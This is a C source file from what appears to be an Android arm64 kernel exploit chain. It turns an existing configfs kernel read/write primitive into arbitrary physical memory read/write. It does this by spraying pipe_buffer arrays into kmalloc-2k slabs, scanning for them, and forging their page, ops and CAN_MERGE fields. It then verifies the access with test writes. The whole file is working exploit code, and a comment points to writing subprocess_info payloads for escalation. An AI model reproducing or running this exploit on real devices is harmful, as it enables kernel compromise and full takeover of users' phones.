/*
 * pipe_physrw.c -- Pipe buffer-based physical memory read/write
 *
 * Upgrades the configfs read/write primitive to support arbitrary byte
 * counts (including single bytes) by forging kernel pipe_buffer entries.
 *
 * Strategy:
 *   page_base (set by the configfs exploit) points to a 32KB slab region
 *   we can already read/write via configfs.  We allocate pipe_buffer
 *   arrays (kmalloc-2k) hoping they land in that same slab, then scan
 *   with configfs to locate and forge them.  Once forged, standard pipe
 *   read()/write() syscalls give us arbitrary kernel memory access.
 *
 * This file replaces the pipe physrw functions in pipe.c.  Do not
 * compile both translation units into the same binary.
 */

#include "common.h"
#include "runtime_struct_offsets.h"

/* ---------- module constants ---------- */

/*
 * VMEMMAP_START / VMEMMAP_END are already defined via target.h / common.h.
 * PIPE_SLAB_SIZE is (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB) = 32KB.
 * We only add constants that differ from the common.h pipe machinery.
 */

#define PHYSRW_SCAN_CHUNK     256
#define PHYSRW_RECLAIM_COUNT  16
#define PHYSRW_DRAIN_COUNT    64
#define PHYSRW_PROOF_OFF      0x7000

/* ---------- module state ---------- */

static int pr_drain_fds[PHYSRW_DRAIN_COUNT][2];
static int pr_reclaim_fds[PHYSRW_RECLAIM_COUNT][2];
static int pr_pipes_ready;

static uintptr_t pr_buf_base;       /* page within order-3 region where bufs live */
static uintptr_t pr_buf_addr;       /* exact kernel address of matched pipe_buffer */
static int       pr_pipe_idx = -1;  /* index into pr_reclaim_fds */

/* Diagnostic globals referenced by fops.c */
int pipe_cache_gate_ok;
int physrw_read_ok;
int physrw_write_ok;
int physrw_read64_ok;
int physrw_write64_ok;

/* Other extern globals declared in common.h that pipe.c normally provides.
 * Defined here so the translation unit is self-contained for linkage. */
pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
uintptr_t pipebuf_actual_ops;
char physrw_readback[64];
char physrw_after_write[64];
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;

/* ---------- runtime offset helpers ---------- */

/*
 * Use active_offsets when available, fall back to target.h compile-time
 * constants otherwise.
 */
static uintptr_t pr_pipe_buf_ops(void) {
  uint64_t off = (active_offsets && active_offsets->off_anon_pipe_buf_ops)
    ? active_offsets->off_anon_pipe_buf_ops : ANON_PIPE_BUF_OPS_OFF;
  return text_addr(KIMAGE_TEXT_BASE + off);
}

static uintptr_t pr_kmalloc_caches(void) {
  uint64_t off = (active_offsets && active_offsets->off_kmalloc_caches)
    ? active_offsets->off_kmalloc_caches : KMALLOC_CACHES_OFF;
  return data_addr(KIMAGE_TEXT_BASE + off);
}

/* ---------- vmemmap conversion ---------- */

uintptr_t direct_to_page(uintptr_t addr) {
  /* Android arm64's non-DEBUG_VIRTUAL virt_to_page() uses the linear-map
   * displacement directly: VMEMMAP_START + ((addr - PAGE_OFFSET) >> PAGE_SHIFT)
   * * sizeof(struct page).  The direct map's PHYS_OFFSET is already reflected
   * in the vmemmap base; adding it here double-counts the first RAM PFNs. */
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uint64_t compound_head =
    kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

/* ---------- pipe buffer allocation helpers ---------- */

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
}

void alloc_pipe_object(int pipefd[2]) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, PIPE_BUFFER_SLOTS * PAGE_SIZE));
}

void free_pipe_object(int pipefd[2]) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
}

/* ---------- pipe buffer preparation (simplified) ---------- */

/*
 * Allocate pipe_buffer arrays hoping they land in the same kmalloc-2k
 * slab as page_base.
 *
 * The drain pipes consume free slots in existing partial slabs.
 * The reclaim pipes should then spill into the page_base slab.
 */
static void pr_prepare_pipe_buffers(void) {
  int i;

  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    make_pipe_object(pr_drain_fds[i]);
  }
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    make_pipe_object(pr_reclaim_fds[i]);
  }
  pr_pipes_ready = 1;

  /* Drain: expand to full size (32 slots each -> kmalloc-2k allocation) */
  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    alloc_pipe_object(pr_drain_fds[i]);
  }

  /* Reclaim: expand to full size -- should land near page_base */
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    alloc_pipe_object(pr_reclaim_fds[i]);
  }
}

/* ---------- cache gate verification ---------- */

/*
 * Verify that page_base's slab belongs to the kmalloc cache used by
 * pipe_buffer arrays (kmalloc-2k).  Scan each 4K page in the order-3
 * (32KB) region and check the slab_cache metadata.
 *
 * On success, sets pr_buf_base to the matching page and returns 1.
 */
static int pr_cache_gate(int fd) {
  if (!is_direct_ptr(page_base)) {
    return 0;
  }

  uintptr_t page_desc = direct_to_page(page_base);
  pr_info("physrw vmemmap decode direct=%016zx descriptor=%016zx "
          "phys_offset=%016llx range=%016llx-%016llx\n",
          page_base, page_desc, (unsigned long long)P0_PHYS_OFFSET,
          (unsigned long long)VMEMMAP_START,
          (unsigned long long)VMEMMAP_END);
  if (page_desc < VMEMMAP_START ||
      page_desc + STRUCT_PAGE_SIZE > VMEMMAP_END) {
    pipe_cache_gate_ok = 0;
    pr_info("physrw vmemmap decode outside configured range\n");
    return 0;
  }

  /* Read the full kmalloc cache pointer table */
  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  kernel_read_data(fd, pr_kmalloc_caches(), cache_slots, sizeof(cache_slots));

  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  /* The pipe_buffer array for 32 slots (32 * 0x28 = 0x500 bytes) goes
   * into kmalloc-2k.  Check both normal and cgroup variants. */
  uint64_t want_normal = cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS +
                                     KMALLOC_PIPE_INDEX];
  uint64_t want_cgroup = cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS +
                                     KMALLOC_PIPE_INDEX];
  kmalloc_pipe_cache = want_cgroup ? want_cgroup : want_normal;

  pr_info("physrw cache gate normal_2k=%016llx cgroup_2k=%016llx\n",
          (unsigned long long)want_normal,
          (unsigned long long)want_cgroup);

  /* Scan each page in the order-3 region */
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page_va = page_base + off;
    uintptr_t head = direct_to_head_page(fd, page_va);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);

    if (off == 0 || slab_cache != 0) {
      candidate_slab_cache = slab_cache;
    }

    int match = slab_cache != 0 &&
      (slab_cache == want_normal || slab_cache == want_cgroup);

    if (match) {
      pr_buf_base = page_va;
      pipe_cache_page_index = (int)(off / PAGE_SIZE);
      pipe_cache_gate_ok = 1;
      pr_info("physrw cache gate OK idx=%zu slab=%016llx\n",
              off / PAGE_SIZE, (unsigned long long)slab_cache);
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

/* Diagnostic for the reclaimed kmalloc-2k page. Unlike pr_cache_gate(),
 * this uses the page actually reclaimed by pipe_reclaim.c rather than the
 * unrelated MCAST payload page. It validates the slab cache before asking
 * configfs to read any slab object, then reads at most one 0x800-byte
 * allocation at a time so hardened-usercopy never spans adjacent objects. */
static int pipe_reclaim_channel_diag_once(int configfs_fd, int attempt) {
  uintptr_t base = prepare_pipe_buffer_page();
  pipebuf_page_base = base;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipebuf_actual_ops = 0;
  pr_info("pipe channel diag: attempt=%d base=%016zx direct=%d reclaim=%d\n",
          attempt, base, is_direct_ptr(base), pipe_reclaim_cnt);
  if (!is_direct_ptr(base))
    goto cleanup;

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  if (kernel_read_data(configfs_fd, pr_kmalloc_caches(), cache_slots,
                       sizeof(cache_slots)) != (ssize_t)sizeof(cache_slots)) {
    pr_warning("pipe channel diag: kmalloc cache table read failed\n");
    goto cleanup;
  }
  uint64_t want_normal =
      cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + KMALLOC_PIPE_INDEX];
  uint64_t want_cgroup =
      cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + KMALLOC_PIPE_INDEX];
  uintptr_t page_desc = direct_to_head_page(configfs_fd, base);
  uint64_t slab_cache = kernel_read64(configfs_fd,
                                      page_desc + STRUCT_SLAB_CACHE_OFF);
  pr_info("pipe channel diag: descriptor=%016zx slab=%016llx "
          "normal2k=%016llx cgroup2k=%016llx\n",
          page_desc, (unsigned long long)slab_cache,
          (unsigned long long)want_normal,
          (unsigned long long)want_cgroup);
  if (!slab_cache ||
      (slab_cache != want_normal && slab_cache != want_cgroup)) {
    pr_warning("pipe channel diag: reclaimed page is not kmalloc-2k; "
               "skipping slab reads\n");
    goto cleanup;
  }

  if (pipe_reclaim_cnt <= 0 || pipe_reclaim_cnt > PIPE_RECLAIM) {
    pr_warning("pipe channel diag: invalid reclaim count=%d max=%d\n",
               pipe_reclaim_cnt, PIPE_RECLAIM);
    goto cleanup;
  }
  char markers[PIPE_RECLAIM];
  memset(markers, 0x61, sizeof(markers));
  int marked = 0;
  for (int i = 0; i < pipe_reclaim_cnt; i++) {
    ssize_t n = write(pipe_reclaim_write_fd((size_t)i), markers, (size_t)i + 1);
    if (n != (ssize_t)i + 1) {
      pr_warning("pipe channel diag: marker write failed pipe=%d "
                 "ret=%zd errno=%d\n", i, n, errno);
      goto cleanup;
    }
    marked++;
  }
  pr_info("pipe channel diag: marked=%d reclaim=%d\n",
          marked, pipe_reclaim_cnt);

  uint64_t ops_off = (active_offsets && active_offsets->off_anon_pipe_buf_ops)
      ? active_offsets->off_anon_pipe_buf_ops : ANON_PIPE_BUF_OPS_OFF;
  const uintptr_t expected_ops_text =
      text_addr(KIMAGE_TEXT_BASE + ops_off);
  const uintptr_t expected_ops_data =
      data_addr(KIMAGE_TEXT_BASE + ops_off);
  pr_info("pipe channel diag: anon_ops text=%016zx data=%016zx\n",
          expected_ops_text, expected_ops_data);
  int matches = 0;
  for (size_t obj = 0; obj < PIPE_OBJS_PER_SLAB; obj++) {
    unsigned char raw[PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer)];
    uintptr_t obj_addr = base + obj * PIPE_OBJECT_SIZE;
    ssize_t n = kernel_read_data(configfs_fd, obj_addr, raw, sizeof(raw));
    if (n != (ssize_t)sizeof(raw)) {
      pr_warning("pipe channel diag: object read failed obj=%zu "
                 "addr=%016zx ret=%zd errno=%d\n",
                 obj, obj_addr, n, errno);
      goto cleanup;
    }
    struct user_pipe_buffer first;
    memcpy(&first, raw, sizeof(first));
    pr_info("pipe channel diag: obj=%zu slot0 page=%016llx off=%u "
            "len=%u ops=%016llx flags=%x private=%016llx\n",
            obj, (unsigned long long)first.page, first.offset, first.len,
            (unsigned long long)first.ops, first.flags,
            (unsigned long long)first.private);
    for (size_t slot = 0; slot < PIPE_BUFFER_SLOTS; slot++) {
      struct user_pipe_buffer pb;
      memcpy(&pb, raw + slot * sizeof(pb), sizeof(pb));
      int ops_match = pb.ops == expected_ops_text ||
                      pb.ops == expected_ops_data;
      if (ops_match) {
        pr_info("pipe channel diag: candidate obj=%zu slot=%zu "
                "page=%016llx off=%u len=%u ops=%016llx flags=%x "
                "private=%016llx\n",
                obj, slot, (unsigned long long)pb.page, pb.offset, pb.len,
                (unsigned long long)pb.ops, pb.flags,
                (unsigned long long)pb.private);
      }
      if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END ||
          pb.offset != 0 || !ops_match ||
          pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0 ||
          pb.len == 0 || pb.len > (uint32_t)pipe_reclaim_cnt)
        continue;
      pr_success("pipe channel diag: buffer obj=%zu slot=%zu "
                 "pipe=%u page=%016llx len=%u\n",
                 obj, slot, pb.len - 1, (unsigned long long)pb.page,
                 pb.len);
      if (!pipebuf_addr && slot == 0 && pb.len >= 1 &&
          pb.len - 1 < (uint32_t)pipe_reclaim_cnt) {
        pipebuf_addr = obj_addr;
        pipebuf_pipe_idx = (int)pb.len - 1;
        pipebuf_actual_ops = (uintptr_t)pb.ops;
        pr_success("pipe channel diag: selected array=%016zx pipe=%d "
                   "ops=%016zx\n", pipebuf_addr, pipebuf_pipe_idx,
                   pipebuf_actual_ops);
      }
      matches++;
    }
  }
  pr_info("pipe channel diag: matching buffers=%d\n", matches);

cleanup:
  if (pipe_prepare_child > 0) {
    kill_child(pipe_prepare_child);
    pipe_prepare_child = -1;
  }
  return pipebuf_addr != 0 && pipebuf_pipe_idx >= 0 &&
         pipebuf_actual_ops != 0;
}

int pipe_reclaim_channel_diag(int configfs_fd) {
  int slabs = env_int_range("GL_PIPE_SLABS", 7, 3, 15);
  int attempts = env_int_range("A15_PIPE_RECLAIM_CHANNEL_ATTEMPTS", 3, 1, 4);
  pipe_drain_cnt = slabs * PIPE_OBJS_PER_SLAB;
  pipe_reclaim_cnt = slabs * PIPE_OBJS_PER_SLAB;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (pipe_reclaim_channel_diag_once(configfs_fd, attempt))
      return 1;
    if (attempt < attempts) {
      pr_warning("pipe channel diag: no owned descriptor on attempt %d; "
                 "resetting pipe population\n", attempt);
      pipe_reclaim_reset_objects();
    }
  }
  pipe_reclaim_reset_objects();
  return 0;
}

/* ---------- pipe buffer scanning ---------- */

/*
 * Scan the slab at 'base' for a valid pipe_buffer entry.
 *
 * Before calling this, each reclaim pipe has had (i+1) bytes written
 * to it.  The kernel sets pipe_buffer.len to the amount of data in the
 * buffer, so we can identify which pipe a buffer belongs to by its len
 * field (len == i+1 => pipe index i).
 *
 * A valid entry has:
 *   page   in [VMEMMAP_START, VMEMMAP_END)
 *   offset == 0
 *   ops    == anon_pipe_buf_ops (runtime address)
 *   flags  == PIPE_BUF_FLAG_CAN_MERGE
 *   private == 0
 *   len    in [1, PHYSRW_RECLAIM_COUNT]
 */
static int pr_find_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pr_buf_addr = 0;
  pr_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;

  /* Read the slab in small chunks */
  for (size_t off = 0; off < ORDER3_SIZE; off += PHYSRW_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PHYSRW_SCAN_CHUNK) !=
        PHYSRW_SCAN_CHUNK) {
      return 0;
    }
  }

  /* Save first 32 bytes for diagnostics */
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  uintptr_t expected_ops = pr_pipe_buf_ops();

  for (size_t off = 0;
       off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));

    /* First filter: page pointer must be in vmemmap range */
    if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END) {
      continue;
    }
    pipe_scan_vmemmap++;

    if (pipe_scan_first_page == 0) {
      pipe_scan_first_page = pb.page;
      pipe_scan_first_ops = pb.ops;
      pipe_scan_first_len = pb.len;
      pipe_scan_first_flags = pb.flags;
    }

    if (pb.ops == expected_ops) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= (uint32_t)PHYSRW_RECLAIM_COUNT) {
      pipe_scan_len++;
    }

    /* Full validation */
    if (pb.offset != 0 || pb.ops != expected_ops ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > (uint32_t)PHYSRW_RECLAIM_COUNT) {
      continue;
    }

    pr_buf_addr = base + off;
    pr_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

/* ---------- pipe-based physical read ---------- */

/*
 * Read 'len' bytes from kernel address 'direct_addr' via pipe.
 *
 * Saves the original pipe_buffer, forges it to point at the target page
 * with len=requested+1 (so the kernel thinks there is data), reads from
 * the pipe fd, then restores the original buffer.
 */
int pipe_phys_read_data(int fd, uintptr_t direct_addr,
                        void *out, size_t len) {
  /* The diagnostic/reclaim route installs rwforge's direct configfs
   * channel, not pr_buf_addr/pr_pipe_idx.  Keep the legacy API usable by
   * root.c callers, and split reads at 4K boundaries for rwforge. */
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIRECT")) {
    if (!out || len == 0 || !is_direct_ptr(direct_addr))
      return 0;
    size_t done = 0;
    while (done < len) {
      uintptr_t addr = direct_addr + done;
      size_t page_left = KS_PAGE_SIZE - (addr & KS_PAGE_MASK);
      if (page_left <= 1)
        return 0;
      size_t chunk = len - done;
      if (chunk > page_left - 1)
        chunk = page_left - 1;
      if (!rwf_phys_read(addr, (char *)out + done, chunk))
        return 0;
      done += chunk;
    }
    return 1;
  }
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  /* Save original pipe_buffer */
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  /* Forge: point at target page, set len=requested+1 so kernel sees data */
  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pr_pipe_buf_ops();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* Read from pipe -- kernel copies from forged page */
  ssize_t got = read(pr_reclaim_fds[pr_pipe_idx][0], out, len);
  int ok = got == (ssize_t)len;

  /* Restore original pipe_buffer */
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return ok;
}

/* ---------- pipe-based physical write ---------- */

/*
 * Write 'len' bytes to kernel address 'direct_addr' via pipe.
 *
 * Forges the pipe_buffer with len=0 and CAN_MERGE, which makes the
 * kernel append our write data directly to the forged page.
 */
int pipe_phys_write_data(int fd, uintptr_t direct_addr,
                         const void *data, size_t len) {
  /* rwf_phys_write is intentionally capped at 128 bytes per forged slot.
   * Split larger callers (notably subprocess_info payloads) without
   * crossing a page boundary. */
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIRECT")) {
    if (!data || len == 0 || !is_direct_ptr(direct_addr))
      return 0;
    size_t done = 0;
    while (done < len) {
      uintptr_t addr = direct_addr + done;
      size_t page_left = KS_PAGE_SIZE - (addr & KS_PAGE_MASK);
      size_t chunk = len - done;
      if (chunk > 128)
        chunk = 128;
      if (chunk > page_left)
        chunk = page_left;
      if (!chunk || !rwf_phys_write(addr, (const char *)data + done, chunk))
        return 0;
      done += chunk;
    }
    return 1;
  }
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  /* Save original pipe_buffer */
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  /* Forge: point at target page, len=0 + CAN_MERGE lets kernel append */
  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pr_pipe_buf_ops();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* Write to pipe -- kernel copies to forged page */
  ssize_t wrote = write(pr_reclaim_fds[pr_pipe_idx][1], data, len);
  int ok = wrote == (ssize_t)len;

  /* Restore original pipe_buffer */
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return ok;
}

/* ---------- convenience wrappers ---------- */

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

/* ---------- reset ---------- */

void reset_pipe_attempt(void) {
  if (pr_pipes_ready) {
    for (int i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
      close(pr_drain_fds[i][0]);
      close(pr_drain_fds[i][1]);
    }
    for (int i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
      close(pr_reclaim_fds[i][0]);
      close(pr_reclaim_fds[i][1]);
    }
    pr_pipes_ready = 0;
  }

  pr_buf_base = 0;
  pr_buf_addr = 0;
  pr_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

/* ---------- orchestration ---------- */

/*
 * Set up pipe-based physical read/write.
 *
 * Steps:
 *   1. Allocate drain + reclaim pipe objects
 *   2. Verify page_base slab belongs to the right kmalloc cache
 *   3. Write size markers to identify individual pipe buffers
 *   4. Scan the slab for a valid pipe_buffer entry
 *   5. Verify read and write via the forged buffer
 *
 * Returns 1 on success, 0 on failure.
 */
int install_pipe_physrw(int configfs_fd) {
  if (getenv("A15_PIPE_RECLAIM_CHANNEL_DIRECT") ||
      getenv("A15_PIPE_RECLAIM_CHANNEL_TEST_ONLY")) {
    if (!pipe_reclaim_channel_diag(configfs_fd)) {
      pr_warning("physrw direct configfs: no owned pipe-buffer array found\n");
      return 0;
    }
    if (!rwf_install_configfs(configfs_fd, pipebuf_addr, pipebuf_pipe_idx,
                             pipebuf_actual_ops)) {
      pr_warning("physrw direct configfs: channel setup failed\n");
      return 0;
    }
    if (!rwf_configfs_selftest(configfs_fd)) {
      pr_warning("physrw direct configfs: reversible read/write test failed\n");
      rwf_configfs_disarm();
      return 0;
    }
    pipe_cache_gate_ok = 1;
    physrw_read_ok = 1;
    physrw_write_ok = 1;
    physrw_read64_ok = 1;
    physrw_write64_ok = 1;
    pr_success("physrw direct configfs: pipe read/write verified\n");
    return 1;
  }

  /* Step 1: allocate pipe buffers near page_base */
  pr_prepare_pipe_buffers();

  /* Step 2: verify slab cache match */
  if (!pr_cache_gate(configfs_fd)) {
    pr_info("physrw cache gate FAILED candidate=%016llx want=%016llx\n",
            (unsigned long long)candidate_slab_cache,
            (unsigned long long)kmalloc_pipe_cache);
    return 0;
  }

  /* Step 3: write size markers for pipe identification.
   * Pipe i gets (i+1) bytes written, so pipe_buffer.len == i+1. */
  char marker[PHYSRW_RECLAIM_COUNT];
  memset(marker, 0x61, sizeof(marker));
  for (int i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    SYSCHK(write(pr_reclaim_fds[i][1], marker, i + 1));
  }

  /* Step 4: scan for pipe_buffer */
  int found = pr_find_buffer(configfs_fd, pr_buf_base);
  pr_info("physrw probe found=%d buf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pr_buf_addr, pr_pipe_idx,
          pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }

  /* Step 5: verify vmemmap round-trip */
  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page_va =
    page_to_direct(direct_to_page(proof_addr));
  if (proof_page_va != (proof_addr & ~(PAGE_SIZE - 1))) {
    pr_info("physrw vmemmap roundtrip FAILED\n");
    return 0;
  }

  /* Step 6: verify read -- write via configfs, read back via pipe */
  char seed[] = "ghostlock_physrw_read";
  if (kernel_write_data(configfs_fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(configfs_fd, proof_addr,
                        physrw_readback, sizeof(seed));
  pr_info("physrw read verify ok=%d idx=%d\n",
          physrw_read_ok, pr_pipe_idx);

  /* Step 7: verify write -- write via pipe, read back via configfs */
  char overwrite[] = "ghostlock_physrw_write";
  physrw_write_ok =
    pipe_phys_write_data(configfs_fd, proof_addr,
                         overwrite, sizeof(overwrite));
  pr_info("physrw write verify ok=%d\n", physrw_write_ok);
  kernel_read_data(configfs_fd, proof_addr,
                   physrw_after_write, sizeof(overwrite));

  /* Step 8: verify 64-bit read/write */
  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = 0x676c6b5f72773064ULL;
  uint64_t next64 = 0x676c6b5f72773164ULL;
  kernel_write_data(configfs_fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(configfs_fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("physrw read64 ok=%d value=%016llx\n",
          physrw_read64_ok, (unsigned long long)physrw_read64_before);

  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(configfs_fd, proof64_addr, next64);
  kernel_read_data(configfs_fd, proof64_addr,
                   &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  int all_ok =
    physrw_read_ok &&
    memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
    physrw_write_ok &&
    memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
    physrw_read64_ok && physrw_write64_ok;

  if (all_ok) {
    pr_info("physrw installed OK buf=%016zx pipe=%d\n",
            pr_buf_addr, pr_pipe_idx);
  }

  return all_ok;
}
